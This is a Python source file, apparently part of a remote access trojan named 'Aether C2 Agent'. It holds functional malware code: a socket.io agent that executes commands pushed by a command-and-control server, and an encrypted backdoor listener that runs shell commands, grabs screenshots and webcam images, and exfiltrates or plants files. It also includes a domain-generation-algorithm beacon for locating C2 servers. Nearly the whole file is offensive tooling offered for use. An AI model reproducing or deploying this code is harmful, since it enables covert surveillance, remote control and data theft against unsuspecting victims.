import socket
import subprocess
import threading
import base64
import hashlib
import io
import logging
import os
import platform
import shutil
import sys
from cryptography.fernet import Fernet
try:
    from pynput import keyboard
except ImportError:
    keyboard = None
try:
    import cv2
except ImportError:
    cv2 = None
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
import requests
import os
import socketio
import time
import uuid
import platform

# --- Aether C2 Agent ---
sio = socketio.Client()
agent_id = f"agent-{uuid.uuid4().hex[:6]}"

@sio.on('connect')
def on_connect():
    logging.info("Connected to Aether C2. Registering agent...")
    sio.emit('register_agent', {
        'id': agent_id,
        'ip': '127.0.0.1', # This would be the public IP in a real scenario
        'os': platform.system(),
    })

@sio.on('execute_command')
def on_execute_command(data):
    command = data['command']
    logging.info(f"Received command from C2: {command}")
    output = subprocess.getoutput(command)
    sio.emit('command_output', {'agent_id': agent_id, 'output': output})

def start_aether_agent(c2_server_url):
    """Starts the agent that connects to the Aether C2 dashboard."""
    sio.connect(c2_server_url)
    sio.wait()


def capture_screenshot():
    if not ImageGrab:
        return None
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format='PNG')
    return buf.getvalue()

def capture_webcam_image():
    if not cv2:
        return None
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    _, buf = cv2.imencode('.jpg', frame)
    return buf.tobytes()

def handle_client(client_socket, backdoor_password):
    try:
        encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(backdoor_password.encode()).digest()))
        client_socket.send(b"Password: ")
        encrypted_password = client_socket.recv(1024)
        password = encryptor.decrypt(encrypted_password).decode().strip()
        if password != backdoor_password:
            client_socket.send(encryptor.encrypt(b"Authentication failed.\n"))
            client_socket.close()
            return
        client_socket.send(encryptor.encrypt(b"Authenticated. Enter commands:\n"))
        while True:
            encrypted_command = client_socket.recv(4096)
            if not encrypted_command:
                break
            command = encryptor.decrypt(encrypted_command).decode().strip()
            if command == "exit":
                break
            elif command == "screenshot":
                img_data = capture_screenshot()
                if img_data:
                    client_socket.send(len(img_data).to_bytes(4, 'big'))
                    client_socket.send(img_data)
                else:
                    client_socket.send(b"0")
            elif command == "webcam_snap":
                img_data = capture_webcam_image()
                if img_data:
                    client_socket.send(len(img_data).to_bytes(4, 'big'))
                    client_socket.send(img_data)
                else:
                    client_socket.send(b"0")
            elif command.startswith("download "):
                filepath = command.split(" ", 1)[1]
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    client_socket.send(len(data).to_bytes(4, 'big'))
                    client_socket.send(data)
                else:
                    client_socket.send(b"0")
            elif command.startswith("upload "):
                try:
                    filepath = command.split(" ", 1)[1]
                    data_len_bytes = client_socket.recv(4)
                    if not data_len_bytes:
                        break
                    data_len = int.from_bytes(data_len_bytes, 'big')
                    with open(filepath, 'wb') as f:
                        while data_len > 0:
                            chunk = client_socket.recv(min(4096, data_len))
                            if not chunk:
                                break
                            f.write(chunk)
                            data_len -= len(chunk)
                    client_socket.send(encryptor.encrypt(b"File uploaded successfully."))
                except Exception as e:
                    client_socket.send(encryptor.encrypt(f"Upload failed: {e}".encode()))
            else:
                output = subprocess.getoutput(command)
                client_socket.send(output.encode() + b"\n")
    except Exception as e:
        logging.error(f"Error handling client: {e}")
    finally:
        client_socket.close()

def backdoor_listener(port, backdoor_password):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    logging.info(f"Backdoor listening on port {port}")

    while True:
        client_socket, addr = server.accept()
        logging.info(f"Connection from {addr}")
        threading.Thread(target=handle_client, args=(client_socket, backdoor_password)).start()

def dga_agent(seed, sleep_interval=3600):
    """
    The main loop for the DGA-based C2 agent.
    """
    from modules.dga import generate_domains
    import datetime
    import socket

    logging.info(f"DGA C2 agent started with seed: {seed}")

    while True:
        today = datetime.date.today()
        domains = generate_domains(seed, today)

        for domain in domains:
            try:
                logging.info(f"Attempting to connect to C2 at {domain}...")
                # In a real scenario, this would be a more sophisticated connection,
                # e.g., an HTTPS request or a custom protocol.
                # Here, we'll simulate by trying to resolve the domain.
                c2_ip = socket.gethostbyname(domain)

                logging.info(f"Successfully connected to C2 at {domain} ({c2_ip}).")
                # --- Begin C2 Communication ---
                # This is where you would implement the command and control logic,
                # similar to the backdoor_listener, but over this connection.
                # For now, we'll just log the success and break the loop.
                print(f"Connected to C2 server at {domain}")
                break # Found a live C2, no need to check more for today.

            except socket.gaierror:
                logging.warning(f"Could not resolve C2 domain: {domain}")
            except Exception as e:
                logging.error(f"An error occurred while connecting to {domain}: {e}")

        logging.info("DGA cycle complete. Sleeping until next cycle.")
        time.sleep(sleep_interval)